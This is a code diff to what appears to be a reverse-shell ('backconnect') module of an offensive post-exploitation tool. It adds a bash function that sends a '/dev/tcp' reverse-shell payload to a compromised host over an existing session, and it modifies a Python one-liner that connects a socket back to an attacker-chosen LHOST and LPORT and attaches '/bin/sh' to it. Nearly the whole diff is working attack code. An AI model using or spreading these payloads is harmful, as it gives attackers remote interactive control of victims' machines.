@@ -22,9 +22,25 @@ variables = {'lhost':'',
 
 reverse_types = ['python3','python3_tty']
 
+def bash_backconnect():
+     try:
+          payload = "bash -c 'bash -i 1>& /dev/tcp/LHOST/LPORT 0>&1' &"
+          sid = variables['session']
+          lhost = variables['lhost']
+          lport = variables['lport']
+          payload = payload.replace('LHOST',lhost).replace('LPORT',lport)
+          if sid:
+               session = get_session_client(sid)
+               if session:
+                    session.send(payload)
+          else:
+               print("[!] Session variable is required!")
+     except Exception as x:
+          print(x)
+          
 def python3_backconnect():
     try:
-        payload = "nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &"
+        payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &"
         sid = variables['session']
         lhost = variables['lhost']
         lport = variables['lport']
@@ -64,5 +80,5 @@ def is_number(cmd):
     
 def run(arguments=''):
     # beta version of backconnect
-    if variables['type'] == 'python3':
-        python3_backconnect()
+     if variables['type'] == 'python3':
+          python3_backconnect()
